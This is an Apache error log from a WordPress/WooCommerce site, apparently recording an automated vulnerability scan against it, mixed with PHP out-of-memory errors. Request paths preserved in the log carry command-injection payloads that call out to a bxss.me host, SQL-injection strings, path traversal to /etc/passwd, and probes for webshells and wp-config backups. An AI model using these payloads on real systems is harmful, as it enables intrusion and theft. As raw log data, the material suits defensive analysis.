[Thu Jul 08 01:17:11.375336 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] PHP Fatal error:  Out of memory (allocated 14680064) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-image.php on line 484
[Thu Jul 08 01:17:11.485901 2021] [php7:error] [pid 7436] [client 27.147.202.214:2619] script '/var/www/html/bubandcompany.com/wp-admin/|(nslookup hitmndimympve1aa1c.bxss.me||perl -e "gethostbyname('hitmndimympve1aa1c.bxss.me')").php' not found or unable to stat
[Thu Jul 08 01:17:11.570859 2021] [php7:error] [pid 7270] [client 27.147.202.214:9683] PHP Fatal error:  Out of memory (allocated 10485760) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/options/extra.php on line 234
[Thu Jul 08 01:17:11.606840 2021] [php7:error] [pid 7403] [client 27.147.202.214:11742] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wp-optimize/includes/class-updraft-ring-logger.php on line 100
[Thu Jul 08 01:17:11.613328 2021] [php7:error] [pid 7403] [client 27.147.202.214:11742] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 65536 bytes) in Unknown on line 0
[Thu Jul 08 01:17:11.615026 2021] [php7:error] [pid 7505] [client 27.147.202.214:7352] PHP Fatal error:  Out of memory (allocated 29360128) (tried to allocate 131072 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-core/shortcodes/fusion-portfolio.php on line 2610
[Thu Jul 08 01:17:11.628345 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] PHP Fatal error:  Out of memory (allocated 14680064) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.php on line 1
[Thu Jul 08 01:17:12.022407 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:17:12.439621 2021] [php7:error] [pid 7436] [client 27.147.202.214:2619] script '/var/www/html/bubandcompany.com/wp-admin/`(nslookup hitzgjiokddfv607eb.bxss.me||perl -e "gethostbyname('hitzgjiokddfv607eb.bxss.me')")`.php' not found or unable to stat
[Thu Jul 08 01:17:12.696908 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:17:13.085660 2021] [core:error] [pid 7395] (36)File name too long: [client 27.147.202.214:7488] AH00036: access to /wp-admin/;(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')")|(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')")&(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')").php failed (filesystem path '/var/www/html/bubandcompany.com/wp-admin/;(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')")|(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')")&(nslookup hitrwexhjwuere2fd3.bxss.me||perl -e "gethostbyname('hitrwexhjwuere2fd3.bxss.me')").php')
[Thu Jul 08 01:17:13.906788 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:17:15.377476 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/~wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:17.234885 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:17:17.300803 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/!wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:18.444406 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/haA3RLCO.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:19.350814 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/install' AND 2*3*8=6*8 AND 'YxDy'='YxDy.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:19.415353 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:17:19.671262 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/install" AND 2*3*8=6*8 AND "4vBY"="4vBY.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:19.996860 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/install%' AND 2*3*8=6*8 AND 'HS9I'!='HS9I%.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:20.203821 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/r57shell.php' not found or unable to stat
[Thu Jul 08 01:17:20.316595 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/-1 OR 2+618-618-1=0+0+0+1.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:20.522261 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/r57.php' not found or unable to stat
[Thu Jul 08 01:17:20.525436 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/phpinfo.php' not found or unable to stat
[Thu Jul 08 01:17:20.637098 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/-1 OR 3+618-618-1=0+0+0+1.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:20.838136 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/r58.php' not found or unable to stat
[Thu Jul 08 01:17:20.990377 2021] [php7:error] [pid 7528] [client 27.147.202.214:10738] script '/var/www/html/bubandcompany.com/wp-admin/css/webadmin.php' not found or unable to stat
[Thu Jul 08 01:17:21.267547 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:17:21.515740 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/install'||'.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:21.722789 2021] [negotiation:error] [pid 6979] [client 27.147.202.214:5604] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:21.836824 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/if(now()=sysdate(),sleep(15),0).php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:21.967439 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:17:22.157800 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:22.209705 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/wp-config (another copy).php' not found or unable to stat
[Thu Jul 08 01:17:22.375621 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/c99shell.php' not found or unable to stat
[Thu Jul 08 01:17:22.478538 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:22.533883 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/wp-config (copy).php' not found or unable to stat
[Thu Jul 08 01:17:22.664801 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:22.689607 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/c99.php' not found or unable to stat
[Thu Jul 08 01:17:22.802808 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/pi.php' not found or unable to stat
[Thu Jul 08 01:17:23.055386 2021] [php7:error] [pid 7234] [client 27.147.202.214:9729] script '/var/www/html/bubandcompany.com/wp-admin/images/apc.php' not found or unable to stat
[Thu Jul 08 01:17:23.362551 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:23.444419 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/php.php' not found or unable to stat
[Thu Jul 08 01:17:23.588628 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/nstview.php' not found or unable to stat
[Thu Jul 08 01:17:23.659374 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/1 waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:23.670997 2021] [authz_core:error] [pid 7511] [client 27.147.202.214:14971] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/css/.htaccess
[Thu Jul 08 01:17:23.765909 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/i.php' not found or unable to stat
[Thu Jul 08 01:17:23.790419 2021] [negotiation:error] [pid 7277] [client 27.147.202.214:13140] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:23.901904 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/nst.php' not found or unable to stat
[Thu Jul 08 01:17:23.977566 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/k51Qqhqi'; waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:24.062471 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:24.080512 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/test.php' not found or unable to stat
[Thu Jul 08 01:17:24.211019 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/rst.php' not found or unable to stat
[Thu Jul 08 01:17:24.399891 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/temp.php' not found or unable to stat
[Thu Jul 08 01:17:24.521959 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/r57eng.php' not found or unable to stat
[Thu Jul 08 01:17:24.717587 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-admin/css/info.php' not found or unable to stat
[Thu Jul 08 01:17:24.763805 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:24.837477 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/css/shell.php' not found or unable to stat
[Thu Jul 08 01:17:24.844085 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/RcrAKBVH' OR 180=(SELECT 180 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:25.049513 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/wp-config - Copy.php' not found or unable to stat
[Thu Jul 08 01:17:25.157124 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/dra.php' not found or unable to stat
[Thu Jul 08 01:17:25.164883 2021] [authz_core:error] [pid 7392] [client 27.147.202.214:11706] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/images/.htaccess
[Thu Jul 08 01:17:25.168680 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/ifavdSI6') OR 68=(SELECT 68 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:25.315843 2021] [negotiation:error] [pid 7441] [client 27.147.202.214:11715] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:25.381697 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] script '/var/www/html/bubandcompany.com/wp-config - Copy (2).php' not found or unable to stat
[Thu Jul 08 01:17:25.481037 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/r.php' not found or unable to stat
[Thu Jul 08 01:17:25.486848 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/NC7Sj7pi')) OR 431=(SELECT 431 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:25.811163 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/install'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:26.067082 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:26.129601 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/1'".php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:26.418189 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] script '/var/www/html/bubandcompany.com/Copy of wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:26.548314 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/lol.php' not found or unable to stat
[Thu Jul 08 01:17:26.736085 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:26.768509 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/@@dpLcq.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:27.618853 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/zehir.php' not found or unable to stat
[Thu Jul 08 01:17:27.648811 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] script '/var/www/html/bubandcompany.com/Copy of Copy of wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:27.941827 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/c-h.v2.php' not found or unable to stat
[Thu Jul 08 01:17:27.977388 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] script '/var/www/html/bubandcompany.com/Copy (2) of wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:28.303673 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] script '/var/www/html/bubandcompany.com/Copy_(1)_of_wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:28.532452 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:28.658894 2021] [php7:error] [pid 7234] [client 27.147.202.214:9729] script '/var/www/html/bubandcompany.com/wp-admin/images/webadmin.php' not found or unable to stat
[Thu Jul 08 01:17:29.688376 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/php-backdoor.php' not found or unable to stat
[Thu Jul 08 01:17:30.040047 2021] [php7:error] [pid 7516] [client 27.147.202.214:5610] script '/var/www/html/bubandcompany.com/wp-download.php' not found or unable to stat
[Thu Jul 08 01:17:30.735925 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] script '/var/www/html/bubandcompany.com/wp-admin/css/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 01:17:30.926495 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/r57shell.php' not found or unable to stat
[Thu Jul 08 01:17:31.126016 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config1.php' not found or unable to stat
[Thu Jul 08 01:17:31.248025 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/r57.php' not found or unable to stat
[Thu Jul 08 01:17:31.343811 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:31.424634 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config2.php' not found or unable to stat
[Thu Jul 08 01:17:31.572026 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/r58.php' not found or unable to stat
[Thu Jul 08 01:17:31.894541 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/c99shell.php' not found or unable to stat
[Thu Jul 08 01:17:31.998022 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:32.426471 2021] [authz_core:error] [pid 7277] [client 27.147.202.214:13140] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/.htaccess
[Thu Jul 08 01:17:32.761312 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/c99.php' not found or unable to stat
[Thu Jul 08 01:17:33.027882 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config (3rd copy).php' not found or unable to stat
[Thu Jul 08 01:17:33.087358 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/nstview.php' not found or unable to stat
[Thu Jul 08 01:17:33.239090 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:33.409711 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/nst.php' not found or unable to stat
[Thu Jul 08 01:17:33.731369 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/rst.php' not found or unable to stat
[Thu Jul 08 01:17:33.896752 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config (third copy).php' not found or unable to stat
[Thu Jul 08 01:17:33.901599 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:34.053189 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/r57eng.php' not found or unable to stat
[Thu Jul 08 01:17:34.217585 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config (4th copy).php' not found or unable to stat
[Thu Jul 08 01:17:34.226997 2021] [php7:error] [pid 7239] [client 27.147.202.214:3697] script '/var/www/html/bubandcompany.com/wp-rss.php' not found or unable to stat
[Thu Jul 08 01:17:34.380751 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/shell.php' not found or unable to stat
[Thu Jul 08 01:17:34.538087 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config - Copy - Copy.php' not found or unable to stat
[Thu Jul 08 01:17:35.190540 2021] [negotiation:error] [pid 7401] [client 27.147.202.214:7681] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:35.248039 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/dra.php' not found or unable to stat
[Thu Jul 08 01:17:36.101070 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/r.php' not found or unable to stat
[Thu Jul 08 01:17:36.162532 2021] [negotiation:error] [pid 7436] [client 27.147.202.214:2619] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:36.423595 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/lol.php' not found or unable to stat
[Thu Jul 08 01:17:36.750512 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/zehir.php' not found or unable to stat
[Thu Jul 08 01:17:37.074752 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/c-h.v2.php' not found or unable to stat
[Thu Jul 08 01:17:37.421160 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/php-backdoor.php' not found or unable to stat
[Thu Jul 08 01:17:38.153490 2021] [php7:error] [pid 7409] [client 27.147.202.214:7760] PHP Fatal error:  Out of memory (allocated 23068672) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/modules/stats.php on line 441
[Thu Jul 08 01:17:38.844849 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/wp-admin/images/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 01:17:38.872888 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] PHP Fatal error:  Out of memory (allocated 33554432) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 292
[Thu Jul 08 01:17:38.899658 2021] [php7:error] [pid 7529] [client 27.147.202.214:5611] PHP Fatal error:  Out of memory (allocated 33554432) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 52
[Thu Jul 08 01:17:39.679390 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/packages/woocommerce-blocks/src/StoreApi/Schemas/CartItemSchema.php on line 36
[Thu Jul 08 01:17:39.700099 2021] [php7:error] [pid 7524] [client 27.147.202.214:14970] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-error.php on line 227
[Thu Jul 08 01:17:40.610303 2021] [php7:error] [pid 7582] [client 204.48.19.85:56848] PHP Fatal error:  Out of memory (allocated 46137344) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/google-analytics-for-wordpress/includes/admin/routes.php on line 320, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721452.5341880321502685546875
[Thu Jul 08 01:17:40.611047 2021] [php7:error] [pid 7419] [client 204.48.19.85:56824] PHP Fatal error:  Out of memory (allocated 35651584) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/packages/woocommerce-blocks/src/StoreApi/Schemas/CartItemSchema.php on line 300, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721451.8895490169525146484375
[Thu Jul 08 01:17:40.674393 2021] [php7:error] [pid 7582] [client 204.48.19.85:56848] PHP Fatal error:  Out of memory (allocated 46137344) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/plugin.php on line 450, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721452.5341880321502685546875
[Thu Jul 08 01:17:40.743516 2021] [php7:error] [pid 7599] [client 204.48.19.85:56878] PHP Fatal error:  Out of memory (allocated 33554432) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/class-wc-ajax.php on line 1061, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721453.7096290588378906250000
[Thu Jul 08 01:17:40.795740 2021] [php7:error] [pid 7599] [client 204.48.19.85:56878] PHP Fatal error:  Out of memory (allocated 33554432) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/general-template.php on line 4031, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721453.7096290588378906250000
[Thu Jul 08 01:17:43.908869 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/old_wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:44.224380 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config_old.php' not found or unable to stat
[Thu Jul 08 01:17:44.890783 2021] [core:error] [pid 7409] [client 27.147.202.214:9914] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:17:45.067921 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/bak_wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:45.387281 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config_bak.php' not found or unable to stat
[Thu Jul 08 01:17:46.102234 2021] [php7:error] [pid 7247] [client 204.48.19.85:56926] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/_inc/lib/core-api/wpcom-endpoints/publicize-connections.php on line 37, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721454.8004961013793945312500
[Thu Jul 08 01:17:46.110413 2021] [php7:error] [pid 7247] [client 204.48.19.85:56926] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 65536 bytes) in Unknown on line 0, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721454.8004961013793945312500
[Thu Jul 08 01:17:46.268678 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/backup_wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:47.986334 2021] [core:error] [pid 7519] [client 27.147.202.214:9679] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:17:48.179874 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/wp-config_backup.php' not found or unable to stat
[Thu Jul 08 01:17:50.017671 2021] [php7:error] [pid 7411] [client 27.147.202.214:2643] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/src/integrations/blocks/breadcrumbs-block.php on line 1
[Thu Jul 08 01:17:50.085080 2021] [php7:error] [pid 7429] [client 27.147.202.214:4911] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/formatting.php on line 5948
[Thu Jul 08 01:17:50.100496 2021] [php7:error] [pid 7429] [client 27.147.202.214:4911] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/version.php on line 1
